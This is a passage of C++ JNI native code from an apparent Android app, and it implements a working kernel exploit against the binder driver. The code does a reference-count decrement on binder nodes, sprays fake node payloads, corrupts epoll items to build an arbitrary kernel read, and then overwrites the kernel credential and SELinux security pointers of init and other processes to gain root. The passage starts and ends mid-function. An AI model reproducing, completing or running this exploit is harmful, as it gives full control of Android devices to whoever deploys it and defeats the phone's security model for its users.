    int observed_cpu = -1;
    bool migrated = released == 0 && pin_current_thread_to_cpu(
            1, &migration_errno, &observed_cpu);
    bool selected_gone = migrated &&
            handle_rejected_with_failed_reply(fd, selected_handle);
    int cpu = sched_getcpu();
    if (fd >= 0) {
        close(fd);
    }

    bool pass = pinned && queued == 0 && released == 0 &&
            release_cpu == 2 && migrated && selected_gone && cpu == 1;
    char state[448];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-client-queue pid=%d"
            " selected_handle=%d cohort=%d ordered=%d"
            " queued=%d queue_errno=%d released=%d release_errno=%d"
            " released_handles=%d explicit_release_all=1"
            " release_cpu=%d migrated=%d migration_errno=%d"
            " migration_observed_cpu=%d selected_gone=%d"
            " post_cpu=%d retained=1",
            pass ? "pass" : "fail", getpid(), selected_handle,
            count, ordered ? 1 : 0, queued, queue_errno,
            released, release_errno, kRawCohortCount,
            release_cpu, migrated ? 1 : 0, migration_errno, observed_cpu,
            selected_gone ? 1 : 0, cpu);
    write_text_file(directory + "/raw-client.queued", state);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_queueRawControlledMany(
        JNIEnv* environment, jclass, jobject binder, jint count,
        jstring directory_string) {
    if (binder == nullptr || directory_string == nullptr ||
        count != kRawVictimCount) {
        return environment->NewStringUTF(
                "status=fail stage=raw-client-queue-many reason=arguments");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=raw-client-queue-many reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    int handle = discover_proxy_handle(environment, binder);
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    bool pinned = handle > 0 &&
            sched_setaffinity(0, sizeof(set), &set) == 0;
    int created = 0;
    for (; pinned && created < count; ++created) {
        RawQueueSlot& slot = g_raw_queue_slots[created];
        slot.handle = handle;
        slot.state.store(0, std::memory_order_relaxed);
        if (pthread_create(&slot.thread, nullptr,
                           raw_queue_worker, &slot) != 0) {
            break;
        }
    }
    int ready = 0;
    for (int attempt = 0; attempt < 5000; ++attempt) {
        ready = 0;
        for (int index = 0; index < created; ++index) {
            ready += g_raw_queue_slots[index].state.load(
                    std::memory_order_acquire) != 0 ? 1 : 0;
        }
        if (ready == created) {
            break;
        }
        usleep(1000);
    }
    int queued = 0;
    int saved_errno = 0;
    for (int index = 0; index < created; ++index) {
        int state = g_raw_queue_slots[index].state.load(
                std::memory_order_acquire);
        if (state == 1) {
            ++queued;
        } else if (state < 0 && saved_errno == 0) {
            saved_errno = -state;
        }
    }
    char state[288];
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-client-queue-many pid=%d handle=%d"
            " created=%d ready=%d queued=%d expected=%d errno=%d cpu=%d",
            queued == count ? "pass" : "fail", getpid(), handle, created,
            ready, queued, count, saved_errno, sched_getcpu());
    write_text_file(directory + "/raw-client.queued", state);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareRawFakeNodeCheck(
        JNIEnv* environment, jclass, jobject target_binder,
        jlong raw_pointer, jlong raw_cookie, jstring directory_string) {
    std::uint64_t node_address = g_disclosed_node_address.load();
    int target_handle = discover_proxy_handle(environment, target_binder);
    if (directory_string == nullptr || target_handle <= 0 ||
        raw_pointer == 0 || raw_cookie == 0 ||
        !kernel_pointer(node_address) ||
        (node_address & UINT64_C(0x7f)) != 0) {
        return environment->NewStringUTF(
                "status=fail stage=raw-fake-prepare reason=preflight");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=raw-fake-prepare reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);

    std::vector<std::uint8_t> payload(128, 0);
    auto put32 = [&](int offset, std::uint32_t value) {
        std::memcpy(payload.data() + offset, &value, sizeof(value));
    };
    auto put64 = [&](int offset, std::uint64_t value) {
        std::memcpy(payload.data() + offset, &value, sizeof(value));
    };
    put64(0, 128);
    put64(8, node_address + 8);
    put64(16, node_address + 8);
    put32(24, 5);
    put64(56, 0);
    put64(64, 0);
    put32(72, 0);
    put32(76, 1);
    put32(80, 1);
    put32(84, 0);
    put64(88, kFakePtrMarker);
    put64(96, kFakeCookieMarker);
    put64(112, node_address + 112);
    put64(120, node_address + 112);

    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    bool pinned = sched_setaffinity(0, sizeof(set), &set) == 0;
    int prefilled = 0;
    bool spray_prepared = pinned && prepare_fake_control_spray(
            payload.data(), &prefilled);
    int fd = spray_prepared ? duplicate_binder_fd() : -1;
    CveResult decrement;
    if (fd >= 0) {
        decrement = send_single_decrement(fd, target_handle,
                static_cast<binder_uintptr_t>(raw_pointer),
                static_cast<binder_uintptr_t>(raw_cookie));
    }
    bool decremented = fd >= 0 &&
            decrement.ioctl_result == 0 &&
            decrement.failed_reply && !decrement.dead_reply;
    int blocked = decremented ? activate_fake_control_spray() : 0;
    if (fd >= 0) {
        close(fd);
    }
    bool stored = blocked == kFakeControlSprayCount;
    if (!stored) {
        release_fake_control_spray();
    }
    bool enabled = stored && write_text_file(
            directory + "/controlled-read.enable",
            "status=pass stage=raw-fake-read-enable");
    char state[640];
    bool pass = pinned && spray_prepared && decremented && stored && enabled;
    std::snprintf(state, sizeof(state),
            "status=%s stage=raw-fake-prepare node_address=0x%" PRIx64
            " raw_pointer=0x%" PRIx64
            " raw_cookie=0x%" PRIx64 " target_handle=%d"
            " client_dead=1 decrement=%d"
            " failed_reply=%d cpu=%d control_blocks=%d"
            " expected=%d prefilled=%d"
            " local_weak_refs=1 local_strong_refs=1 unlink_enabled=0",
            pass ? "pass" : "fail", node_address,
            static_cast<std::uint64_t>(raw_pointer),
            static_cast<std::uint64_t>(raw_cookie),
            target_handle,
            decrement.ioctl_result,
            decrement.failed_reply ? 1 : 0,
            sched_getcpu(), blocked, kFakeControlSprayCount, prefilled);
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_prepareRawArbitraryRead(
        JNIEnv* environment, jclass, jobject target_binder,
        jlong raw_pointer, jlong raw_cookie, jstring directory_string) {
    std::lock_guard<std::mutex> producer_lock(
            g_terminal_resource_producer_mutex);
    if (g_split_decrement_quarantine_gate.load(
                std::memory_order_acquire)) {
        return environment->NewStringUTF(
                "status=fail stage=arb-read-prepare"
                " reason=split-quarantine reboot_required=1");
    }
    g_raw_victim_nodes[0] = 0;
    g_raw_arbitrary_retained = false;
    g_raw_retained_worker = -1;
    g_raw_arbitrary_handoff_failed = false;
    g_raw_victim0_canonical_original = false;
    g_raw_arbitrary_rearm_worker = -1;
    g_selected_epoll_fd = -1;
    g_selected_epoll_watched_fd = -1;
    if (g_terminal_fd_retirement_gate.load(
                std::memory_order_acquire)) {
        return environment->NewStringUTF(
                "status=fail stage=arb-read-prepare"
                " reason=fd-retirement");
    }
    std::uint64_t node = g_disclosed_node_address.load();
    std::uint64_t file = g_disclosed_file_address.load();
    std::uint64_t epitem = g_disclosed_epitem_address.load();
    int target_handle = discover_proxy_handle(environment, target_binder);
    bool file_probe_ready = false;
    {
        std::lock_guard<std::mutex> lock(g_epitem_mutex);
        file_probe_ready = !g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire) &&
                !g_file_probe_fds.empty();
    }
    if (directory_string == nullptr || target_handle <= 0 ||
        raw_pointer == 0 || raw_cookie == 0 ||
        !kernel_pointer(node) || !kernel_pointer(file) ||
        !kernel_pointer(epitem) || (node & UINT64_C(0x7f)) != 0 ||
        (epitem & UINT64_C(0x7f)) != 0 || !file_probe_ready) {
        return environment->NewStringUTF(
                "status=fail stage=arb-read-prepare reason=preflight");
    }
    const char* characters = environment->GetStringUTFChars(
            directory_string, nullptr);
    if (characters == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=arb-read-prepare reason=directory");
    }
    std::string directory(characters);
    environment->ReleaseStringUTFChars(directory_string, characters);
    {
        std::lock_guard<std::mutex> lock(g_raw_reply_signal_mutex);
        if (g_terminal_fd_retirement_gate.load(
                    std::memory_order_acquire)) {
            return environment->NewStringUTF(
                    "status=fail stage=arb-read-prepare"
                    " reason=fd-retirement");
        }
        bool old_closed = g_raw_reply_signal_fd < 0 ||
                close(g_raw_reply_signal_fd) == 0;
        g_raw_reply_signal_fd = -1;
        if (old_closed) {
            g_raw_reply_signal_fd = open(
                    (directory + "/raw-extra-export.reply-signal").c_str(),
                    O_WRONLY | O_CLOEXEC);
        }
        if (g_raw_reply_signal_fd < 0) {
            return environment->NewStringUTF(
                    "status=fail stage=arb-read-prepare reason=signal");
        }
    }

    int modified = 0;
    int probe_modified = 0;
    {
        std::lock_guard<std::mutex> lock(g_epitem_mutex);
        if (!g_epitem_fds.empty()) {
            int watched = g_epitem_fds[0];
            std::uint64_t data = epitem + 88 - 24;
            for (std::size_t index = 1; index < g_epitem_fds.size();
                 ++index) {
                if (!set_epitem_data(g_epitem_fds[index], watched, data)) {
                    break;
                }
                ++modified;
            }
            if (g_file_probe_fds.size() ==
                    g_file_probe_epoll_fds.size()) {
                for (std::size_t index = 0;
                     index < g_file_probe_fds.size(); ++index) {
                    if (!set_epitem_data(
                            g_file_probe_epoll_fds[index],
                            g_file_probe_fds[index], data)) {
                        break;
                    }
                    ++probe_modified;
                }
            }
        }
    }
    std::vector<std::uint8_t> payload = make_fake_node_payload(
            node, epitem + 80, file + 32, false);
    SplitDecrementContext* split_context =
            new (std::nothrow) SplitDecrementContext();
    if (split_context == nullptr) {
        return environment->NewStringUTF(
                "status=fail stage=arb-read-prepare"
                " reason=split-context reboot_required=1");
    }
    SplitDecrementContext& split = *split_context;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(2, &set);
    bool pinned = modified == kEpitemPreDrainCount + kEpitemCount &&
            probe_modified == kEpitemCount &&
            sched_setaffinity(0, sizeof(set), &set) == 0;
    int prefilled = 0;
    bool spray_prepared = pinned && prepare_fake_control_spray(
            payload.data(), &prefilled, true);
    int fd = spray_prepared ? duplicate_binder_fd() : -1;
    split.fd = fd;
    split.target = target_handle;
    split.victim_pointer = static_cast<binder_uintptr_t>(raw_pointer);
    split.victim_cookie = static_cast<binder_uintptr_t>(raw_cookie);
    bool generation_captured = false;
    if (spray_prepared) {
        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
        generation_captured = capture_split_decrement_generation_locked(
                &split);
    }
    bool coordinator_pinned = false;
    if (spray_prepared && fd >= 0 && generation_captured) {
        pthread_attr_t attributes;
        pthread_attr_init(&attributes);
        int created = pthread_create(&split.thread, &attributes,
                                     run_split_decrement, &split);
        pthread_attr_destroy(&attributes);
        split.thread_created = created == 0;
        if (split.thread_created) {
            coordinator_pinned = pin_current_thread_to_cpu(
                    1, nullptr, &split.coordinator_cpu);
        }
    }
    bool activated = false;
    if (split.thread_created && coordinator_pinned) {
        activated = activate_split_decrement_spray(&split);
    }
    bool post_go = split.go_issued;
    bool joined = false;
    bool context_quarantined = false;
    if (split.thread_created) {
        joined = join_split_decrement_thread(&split, !post_go);
        if (!joined) {
            context_quarantined = true;
            quarantine_split_decrement_context(split_context);
        }
    }
    bool fd_closed = fd < 0;
    if (!split.thread_created) {
        if (fd >= 0 && close_owned_fd(fd)) {
            split.fd = -1;
            fd_closed = true;
        }
        if (!fd_closed && fd >= 0) {
            context_quarantined = true;
            quarantine_split_decrement_context(split_context);
        }
    } else if (joined) {
        if (split.fd < 0 || close_owned_fd(split.fd)) {
            split.fd = -1;
            fd_closed = true;
        } else {
            context_quarantined = true;
            quarantine_split_decrement_context(split_context);
        }
    }
    bool restored_cpu2 = false;
    if (pinned || coordinator_pinned || split.thread_created) {
        int restored_cpu = -1;
        restored_cpu2 = pin_current_thread_to_cpu(
                2, nullptr, &restored_cpu) && restored_cpu == 2;
    }
    bool split_thread_live = split.thread_created &&
            !split.thread_exited.load(std::memory_order_acquire);
    int expected = 0;
    int blocked = 0;
    int decrements = 0;
    bool stored = false;
    if (!split_thread_live) {
        expected = split.expected;
        blocked = split.blocked;
        decrements = split.exact_write ? 1 : 0;
        stored = activated && joined && fd_closed &&
                !context_quarantined &&
                split.exact_write && split.staged_wake &&
                split.generation_valid && split.staged_stable &&
                split.global_published && split.all_entered &&
                split.blocked == split.expected &&
                split.expected == kFakeControlSprayCount &&
                split.staged_expected == kFakeControlStagedCount &&
                split.staged_active == kFakeControlStagedCount &&
                split.read_result == 0 && split.exact_read &&
                split.read_tid == split.tid &&
                split.write_enter_cpu == 2 && split.write_return_cpu == 2 &&
                split.read_enter_cpu == 1 && split.read_return_cpu == 1 &&
                split.coordinator_cpu == 1 && restored_cpu2 &&
                !g_terminal_fd_retirement_gate.load(
                        std::memory_order_acquire);
    }
    if (!stored && !post_go && !context_quarantined && spray_prepared) {
        release_fake_control_spray();
    }
    bool candidate_pass = !split_thread_live && pinned && spray_prepared &&
            generation_captured &&
            coordinator_pinned && split.thread_created &&
            split.go_issued && split.write_attempted.load(
                    std::memory_order_acquire) &&
            decrements == kRawDecrementCount && stored;
    bool reboot_required = context_quarantined ||
            (post_go && !candidate_pass);
    int gate_error = 0;
    bool free_gate = false;
    bool enabled = false;
    bool gate_unlinked_free = false;
    bool gate_unlinked_read = false;
    char state[4096];
    auto format_state = [&](const char* status, bool reboot) {
        return std::snprintf(state, sizeof(state),
                "status=%s stage=arb-read-prepare node=0x%" PRIx64
                " file=0x%" PRIx64 " epitem=0x%" PRIx64
                " raw_pointer=0x%" PRIx64
                " raw_cookie=0x%" PRIx64
                " next=0x%" PRIx64 " pprev=0x%" PRIx64
                " decrements=%d expected_decrements=%d epitems=%d"
                " probe_epitems=%d"
                " control_blocks=%d expected_blocks=%d prefilled=%d"
                " coordinator_cpu=%d restored_cpu2=%d"
                " thread_created=%d thread_joined=%d go_issued=%d"
                " thread_exited=%d"
                " join_timed_out=%d join_result=%d quarantined=%d"
                " fd_closed=%d write_attempted=%d write_rc=%d"
                " write_errno=%d write_consumed=%" PRIu64
                " write_read_consumed=%" PRIu64 " write_expected=%zu"
                " write_enter_cpu=%d write_return_cpu=%d tid=%d"
                " generation=0x%" PRIx64 " staged_generation=%d"
                " generation_captured=%d generation_valid=%d expected=%d"
                " staged_expected=%d staged_active=%d staged_wake=%d"
                " staged_state2=%d staged_stable=%d global_published=%d"
                " all_entered=%d all_state2=%d blocked=%d"
                " read_rc=%d read_errno=%d read_consumed=%" PRIu64
                " read_write_consumed=%" PRIu64
                " read_enter_cpu=%d read_return_cpu=%d read_tid=%d"
                " poll_rc=%d poll_errno=%d poll_revents=%d"
                " read_first=0x%08" PRIx32 " read_second=0x%08" PRIx32
                " read_responses=%d noop=%d failed_reply=%d dead_reply=%d"
                " unexpected=%d malformed=%d exact_read=%d"
                " retirement_before_go=%d retirement_after_write=%d"
                " gate_error=%d gate_free=%d gate_read=%d"
                " gate_unlinked_free=%d gate_unlinked_read=%d"
                " reboot_required=%d",
                status, node, file, epitem,
                static_cast<std::uint64_t>(split.victim_pointer),
                static_cast<std::uint64_t>(split.victim_cookie),
                epitem + 80, file + 32,
                decrements, kRawDecrementCount, modified, probe_modified,
                blocked, expected,
                prefilled,
                split.coordinator_cpu,
                restored_cpu2 ? 1 : 0, split.thread_created ? 1 : 0,
                joined ? 1 : 0, split.go_issued ? 1 : 0,
                split.thread_exited.load(std::memory_order_acquire) ? 1 : 0,
                split.join_timed_out ? 1 : 0, split.join_result,
                context_quarantined ? 1 : 0, fd_closed ? 1 : 0,
                split.write_attempted.load(std::memory_order_acquire) ? 1 : 0,
                split.write_result, split.write_errno,
                static_cast<std::uint64_t>(split.write_consumed),
                static_cast<std::uint64_t>(split.write_read_consumed),
                kSplitDecrementWriteSize, split.write_enter_cpu,
                split.write_return_cpu, split.tid, split.generation,
                split.staged_generation, generation_captured ? 1 : 0,
                split.generation_valid ? 1 : 0, split.expected,
                split.staged_expected, split.staged_active,
                split.staged_wake ? 1 : 0, split.staged_state2,
                split.staged_stable ? 1 : 0,
                split.global_published ? 1 : 0, split.all_entered ? 1 : 0,
                split.all_state2, split.blocked, split.read_result,
                split.read_errno,
                static_cast<std::uint64_t>(split.read_consumed),
                static_cast<std::uint64_t>(split.read_write_consumed),
                split.read_enter_cpu, split.read_return_cpu, split.read_tid,
                split.poll_result, split.poll_errno,
                static_cast<int>(split.poll_revents), split.read_first,
                split.read_second, split.read_responses,
                split.read_transaction_complete, split.read_failed_reply,
                split.read_dead_reply, split.read_unexpected,
                split.read_malformed ? 1 : 0, split.exact_read ? 1 : 0,
                split.retirement_before_go ? 1 : 0,
                split.retirement_after_write ? 1 : 0, gate_error,
                free_gate ? 1 : 0, enabled ? 1 : 0,
                gate_unlinked_free ? 1 : 0, gate_unlinked_read ? 1 : 0,
                reboot ? 1 : 0);
    };
    int state_length = 0;
    bool telemetry_complete = false;
    if (split_thread_live) {
        gate_error = 4;
        reboot_required = true;
        state_length = std::snprintf(state, sizeof(state),
                "status=fail stage=arb-read-prepare"
                " reason=split-join-timeout fd_retained=1"
                " quarantine=1 reboot_required=1");
        telemetry_complete = state_length >= 0 &&
                static_cast<std::size_t>(state_length) < sizeof(state);
    } else {
        state_length = format_state(candidate_pass ? "pass" : "fail",
                                    reboot_required);
        telemetry_complete = state_length >= 0 &&
                static_cast<std::size_t>(state_length) < sizeof(state);
    }
    if (!telemetry_complete) {
        gate_error = 3;
        reboot_required = true;
        candidate_pass = false;
        state_length = std::snprintf(state, sizeof(state),
                "status=fail stage=arb-read-prepare"
                " reason=telemetry-truncated gate_error=3"
                " reboot_required=1");
        telemetry_complete = state_length >= 0 &&
                static_cast<std::size_t>(state_length) < sizeof(state);
    }
    bool pass = false;
    if (candidate_pass && telemetry_complete) {
        const std::string free_path =
                directory + "/controlled-free.enable.0";
        const std::string read_path =
                directory + "/controlled-read.enable.0";
        free_gate = write_text_file(free_path, "0");
        enabled = free_gate && write_text_file(
                read_path, "status=pass stage=arb-read-enable victim=0");
        if (!free_gate || !enabled) {
            gate_error = free_gate ? 2 : 1;
            gate_unlinked_free = unlink(free_path.c_str()) == 0;
            gate_unlinked_read = unlink(read_path.c_str()) == 0;
            free_gate = false;
            enabled = false;
            reboot_required = true;
        } else {
            pass = true;
        }
    }
    if (!pass && candidate_pass && !telemetry_complete) {
        reboot_required = true;
    }
    if (split_thread_live) {
        state_length = std::snprintf(state, sizeof(state),
                "status=fail stage=arb-read-prepare"
                " reason=split-join-timeout fd_retained=1"
                " quarantine=1 reboot_required=1");
    } else {
        state_length = format_state(pass ? "pass" : "fail",
                                    reboot_required);
    }
    if (state_length < 0 ||
        static_cast<std::size_t>(state_length) >= sizeof(state)) {
        if (candidate_pass) {
            unlink((directory + "/controlled-free.enable.0").c_str());
            unlink((directory + "/controlled-read.enable.0").c_str());
        }
        pass = false;
        reboot_required = true;
        std::snprintf(state, sizeof(state),
                "status=fail stage=arb-read-prepare"
                " reason=telemetry-truncated gate_error=3"
                " reboot_required=1");
    }
    if (pass) {
        g_raw_target_handle = target_handle;
        g_raw_victim_nodes[0] = node;
    }
    if (!context_quarantined) {
        delete split_context;
    }
    return environment->NewStringUTF(state);
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_vandam_prism_NativeBridge_handoffRawArbitraryRead(
        JNIEnv* environment, jclass, jint worker) {
    std::unique_lock<std::mutex> producer_lock(
            g_terminal_resource_producer_mutex);
    int released = -1;
    bool marked = false;
    bool retained_state2 = false;
    int poison_count = 0;
    bool inactive_after = false;
    int expected_after = -1;
    {
        std::lock_guard<std::mutex> lock(g_fake_control_mutex);
        bool gate_clear = !g_terminal_fd_retirement_gate.load(
                std::memory_order_acquire);
        bool worker_valid = worker >= 0 &&
                worker < kFakeControlSprayCount;
        if (gate_clear && worker_valid && g_fake_control_active &&
            g_fake_control_expected == kFakeControlSprayCount) {
            auto& slot = g_fake_control_slots[worker];
            std::uint32_t safe_check = 0;
            std::uint64_t pointer = 0;
            std::uint64_t cookie = 0;
            std::memcpy(&safe_check, slot.payload + 76,
                        sizeof(safe_check));
            std::memcpy(&pointer, slot.payload + 88,
                        sizeof(pointer));
            std::memcpy(&cookie, slot.payload + 96,
                        sizeof(cookie));
            bool indexed = pointer == (kIndexedPtrBase |
                    static_cast<std::uint32_t>(worker)) &&
                    cookie == (kIndexedCookieBase |
                    static_cast<std::uint32_t>(worker));
            bool safe_worker = !slot.poisoned && slot.created &&
                    slot.state.load(std::memory_order_acquire) == 2 &&
                    safe_check == 0 && indexed;
            if (safe_worker) {
                slot.poisoned = true;
                slot.poison_victim = 0;
                marked = true;
                released = release_fake_control_spray_locked();
                retained_state2 = slot.poisoned &&
                        slot.poison_victim == 0 && slot.created &&
                        !slot.rearm_requested.load(
                                std::memory_order_acquire) &&
                        slot.state.load(std::memory_order_acquire) == 2;
                poison_count = poisoned_control_count_locked();
                inactive_after = !g_fake_control_active;
                expected_after = g_fake_control_expected;
            }
        }
    }
    bool pass = marked && released == kFakeControlSprayCount - 1 &&
            retained_state2 && poison_count == 1 &&
            inactive_after && expected_after == 0 &&
            !g_terminal_fd_retirement_gate.load(std::memory_order_acquire);
    if (!pass) {
        g_raw_arbitrary_handoff_failed = true;
    } else {
        g_raw_arbitrary_handoff_failed = false;
        g_raw_arbitrary_retained = true;
        g_raw_retained_worker = worker;
        g_raw_arbitrary_rearm_worker = worker;
        g_raw_victim0_canonical_original = false;
    }
    char state[768];
    std::snprintf(state, sizeof(state),
            "status=%s stage=arb-read-handoff worker=%d"
            " marked=%d released=%d expected_release=%d"
            " active_after=%d expected_after=%d retained_state2=%d"
            " poison=%d replacement_spray=0"
            " reboot_required=%d",
            pass ? "pass" : "fail", worker, marked ? 1 : 0,
            released, kFakeControlSprayCount - 1,
            inactive_after ? 0 : 1, expected_after,
            retained_state2 ? 1 : 0, poison_count,
            pass ? 0 : 1);
    return environment->NewStringUTF(state);
}

std::uint64_t root_write_target(int victim) {
    if (g_direct_init_target) {
        if (g_direct_security_repair) {
            if (victim == 1) {
                return g_direct_init_cred_slot;
            }
            if (victim == 2 || victim == 4) {
                return g_security_target_cred + 8;
            }
            if (victim == 3) {
                return g_direct_init_real_cred_slot;
            }
            if (g_direct_terminal_cleanup && victim == 5) {
                return g_security_target_cred + kCredSecurityOffset;
            }
            if (g_direct_terminal_cleanup && victim == 6) {
                return g_terminal_memfd_inode_security_slot;
            }
            if (victim == 5 && g_direct_cred_quarantine) {
                return g_security_target_cred;
            }
            return 0;
        }
        if (victim == 1) {
            return g_direct_init_real_cred_slot;
        }
        if (victim == 2) {
            return g_direct_init_cred_slot;
        }
        return 0;
    }
    switch (victim) {
        case 1:
            return g_arb_cred_address + 28;
        case 2:
        case 4:
            return g_arb_cred_address + kCredSecurityOffset;
        case 3:
            return g_security_target_blob + 8;
        case 5:
            return g_credential_target_security + 8;
        default:
            return 0;
    }
}

std::uint64_t root_write_value(int victim, std::uint64_t address) {
    if (g_direct_init_target &&
        victim > 0 && victim < kRawVictimCount) {
        if (g_direct_cred_quarantine &&
            g_direct_write_step == 5 &&
            address == g_security_target_cred) {
            return g_direct_quarantine_value;
        }
        if (g_direct_terminal_cleanup &&
            g_direct_write_step == 5) {
            return g_terminal_ueventd_security;
        }
        if (g_direct_terminal_cleanup &&
            g_direct_write_step == 6) {
            return g_terminal_vendor_inode_security;
        }
        if (g_direct_security_repair &&
            address == g_security_target_cred + 8) {
            return g_security_target_cred_repair;
        }
        return g_direct_cred_value;
    }
    if (victim == 1) {
        return g_security_target_cred_ids[3];
    }
    if (victim == 2) {
        return g_security_target_blob;
    }
    if (victim == 4) {
        return g_credential_target_security;
    }
    return 0;
}

bool validate_terminal_swapped_donor() {
    if (!g_terminal_ctlbuf_profile_valid ||
        !kernel_pointer(g_terminal_ueventd_security) ||
        !kernel_pointer(g_terminal_memfd_inode_security_slot)) {
        return false;
    }
    std::uint64_t helper_real = 0;
    std::uint64_t helper_cred = 0;
    std::uint64_t donor_real = 0;
    std::uint64_t donor_cred = 0;
    std::uint64_t donor_security = 0;
    std::uint64_t donor_repair = UINT64_MAX;
    std::uint64_t borrowed_collateral = 0;
    std::uint64_t header = 0;
    std::uint32_t sid = 0;
    return reliable_read64(g_direct_init_real_cred_slot, &helper_real) &&
            helper_real == g_security_target_cred &&
            reliable_read64(g_direct_init_cred_slot, &helper_cred) &&
            helper_cred == g_security_target_cred &&
            reliable_read64(
                    g_security_target_real_cred_slot, &donor_real) &&
            donor_real == g_security_target_cred &&
            reliable_read64(g_security_target_cred_slot, &donor_cred) &&
            donor_cred == g_security_target_cred &&
            reliable_read64(
                    g_security_target_cred + kCredSecurityOffset,
                    &donor_security) &&
            donor_security == g_terminal_ueventd_security &&
            reliable_read64_allow_zero(
                    g_security_target_cred + 8,
                    g_security_target_cred_slot,
                    g_security_target_cred, &donor_repair) &&
            donor_repair == 0 &&
            reliable_read64(
                    g_terminal_ueventd_security + 8,
                    &borrowed_collateral) &&
            borrowed_collateral ==
                    g_security_target_cred + kCredSecurityOffset &&
            reliable_read32(
                    g_terminal_ueventd_security + 4, &sid) &&
            sid == g_terminal_ueventd_sid &&
            reliable_read64_allow_zero(
                    g_security_target_cred,
                    g_security_target_cred_slot,
                    g_security_target_cred, &header) &&
            static_cast<std::uint32_t>(header) ==
                    g_security_target_baseline_usage + 2U &&
            static_cast<std::uint32_t>(header >> 32U) == 0;
}

bool quarantine_pointer_valid(std::uint64_t pointer) {
    constexpr std::uint32_t kUsageFloor = 0x00100000U;
    constexpr std::uint32_t kUsageCeiling = 0x3fffffffU;
    std::uint32_t usage = static_cast<std::uint32_t>(pointer);
    std::uint32_t uid = static_cast<std::uint32_t>(pointer >> 32U);
    return kernel_pointer(pointer) && (pointer & 0x7fU) == 0 &&
            usage >= kUsageFloor &&
            usage <= kUsageCeiling && uid != UINT32_MAX;
}

bool quarantined_header_valid(std::uint64_t header,
                              std::uint64_t pointer) {
    if (!quarantine_pointer_valid(pointer) ||
        static_cast<std::uint32_t>(header >> 32U) !=
                static_cast<std::uint32_t>(pointer >> 32U)) {
        return false;
    }
    std::int64_t delta = static_cast<std::int64_t>(
            static_cast<std::uint32_t>(header)) -
            static_cast<std::int64_t>(
                    static_cast<std::uint32_t>(pointer));
    return delta >= -65536 && delta <= 65536;
}

bool validate_direct_write_gate(std::uint64_t address, int victim) {
    int final_step = g_direct_terminal_cleanup
            ? 6 : g_direct_cred_quarantine ? 5 : 4;
    bool donor_live = g_direct_terminal_cleanup &&
            g_direct_write_step == 6
            ? validate_terminal_swapped_donor()
            : validate_live_security_target();
    if (!g_direct_security_repair || g_direct_write_step < 1 ||
        g_direct_write_step > final_step ||
        address != root_write_target(g_direct_write_step) ||
        !donor_live ||
        (g_direct_terminal_cleanup &&
         !g_terminal_ctlbuf_profile_valid)) {
        return false;
    }
    if (g_direct_cred_quarantine && g_direct_write_step == 5 &&
        (victim <= 0 || victim >= kRawVictimCount ||
         g_direct_quarantine_value != g_raw_victim_nodes[victim] ||
         !quarantine_pointer_valid(g_direct_quarantine_value))) {
        return false;
    }
    std::uint64_t donor_real_cred = 0;
    std::uint64_t donor_cred = 0;
    std::uint64_t donor_repair = UINT64_MAX;
    std::uint64_t helper_real_cred = 0;
    std::uint64_t helper_cred = 0;
    std::uint64_t expected_helper_real = g_direct_write_step >= 4
                    ? g_direct_cred_value : g_private_cred;
    std::uint64_t expected_helper_cred = g_direct_write_step >= 2
            ? g_direct_cred_value : g_private_cred;
    std::uint64_t expected_repair = g_direct_write_step == 2
            ? g_direct_init_cred_slot
            : g_direct_write_step == 4
                    ? g_direct_init_real_cred_slot : 0;
    bool valid = reliable_read64(
                    g_direct_init_real_cred_slot,
                    &helper_real_cred) &&
            helper_real_cred == expected_helper_real &&
            reliable_read64(g_direct_init_cred_slot, &helper_cred) &&
            helper_cred == expected_helper_cred &&
            reliable_read64(
                    g_security_target_real_cred_slot,
                    &donor_real_cred) &&
            donor_real_cred == g_security_target_cred &&
            reliable_read64(g_security_target_cred_slot, &donor_cred) &&
            donor_cred == g_security_target_cred &&
            reliable_read64_allow_zero(
                    g_security_target_cred + 8,
                    g_security_target_cred_slot,
                    g_security_target_cred, &donor_repair) &&
            donor_repair == expected_repair;
    std::uint32_t terminal_refs =
            g_direct_write_step == 5 || g_direct_write_step == 6
                    ? 2U : 0U;
    std::uint32_t expected_usage = g_security_target_baseline_usage +
            (g_direct_terminal_cleanup
                    ? terminal_refs
                    : g_direct_write_step >= 3 ? 2U : 0U);
    g_last_write_expected_usage = expected_usage;
    g_last_write_observed_usage = 0;
    if (valid &&
        (g_direct_write_step == 1 || g_direct_write_step == 3)) {
        std::uint64_t snapshot_repair = UINT64_MAX;
        valid = validate_zero_root_cred_snapshot(
                g_security_target_task, g_security_target_cred,
                g_security_target_real_cred_slot,
                g_security_target_cred_slot,
                g_security_target_blob, g_fake_security_sid,
                &snapshot_repair) && snapshot_repair == 0 &&
                static_cast<std::uint32_t>(g_zero_snapshot_header) ==
                        expected_usage;
        g_last_write_observed_usage = static_cast<std::uint32_t>(
                g_zero_snapshot_header);
    } else if (valid) {
        std::uint64_t header = 0;
        std::uint32_t uid = UINT32_MAX;
        std::uint32_t sgid = UINT32_MAX;
        std::uint64_t effective_ids = UINT64_MAX;
        std::uint64_t fs_ids = UINT64_MAX;
        valid = reliable_read64_allow_zero(
                g_security_target_cred,
                g_security_target_cred_slot,
                g_security_target_cred, &header) &&
                static_cast<std::uint32_t>(header) == expected_usage &&
                static_cast<std::uint32_t>(header >> 32U) == 0 &&
                arbitrary_read32_allow_zero(
